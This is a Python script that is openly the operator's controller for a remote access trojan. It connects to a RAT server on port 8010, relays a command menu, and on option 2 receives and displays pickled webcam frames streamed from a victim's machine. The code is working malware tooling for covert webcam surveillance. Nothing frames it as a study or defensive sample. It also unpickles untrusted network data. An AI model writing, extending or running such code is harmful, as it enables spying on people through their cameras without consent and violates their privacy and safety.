import socket
import cv2
import struct
import pickle
from time import sleep


HOST = ''
# PORT FOR RAT CONTROLLER CONNECTION
PORT = 8010

# Camera Data receiving function
def recvall(sock, count):
    buf = b''
    while count:
        new_buf = sock.recv(count)
        if not new_buf:
            return None
        buf += new_buf
        count -= len(new_buf)
    return buf

# Acess Web Cam Main Function:
def access_webcam():
    x = client_socket.recv(1024).decode('utf-8')
    print(x)
    # Receive and display the streamed frames
    while True:
        # Read the length of the data
        msg_size =  struct.calcsize("L")
        data_len = recvall(client_socket, msg_size)
        if not data_len:
            break

        # Unpack the data length and receive the data
        data_len = struct.unpack("L", data_len)[0]
        data = recvall(client_socket, data_len)

        # Deserialize the received data into a frame
        frame = pickle.loads(data)

        # Display the frame
        cv2.imshow('Stream', frame)

        # Wait for a key press and break the loop if 'q' is pressed
        key = cv2.waitKey(1) & 0xFF

        # USING A SHORT KEY q TO QUIT:
        if key == ord('q'):
            break

    # Close the socket and destroy any OpenCV windows
    client_socket.close()
    cv2.destroyAllWindows()

def connect_clientsocket():
    client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client_socket.connect((HOST,PORT))
    return client_socket

client_socket =  connect_clientsocket()

while True:
    x = client_socket.recv(1024).decode('utf-8')
    if 'Enter Your INPUT Here: ' in x :
        print(x)
        answer = input()
        client_socket.send(answer.encode('utf-8'))
        if int(answer) == 2:
            # sleep(2)
            access_webcam()
    else:
        print(x)
        # print('condition of else!')
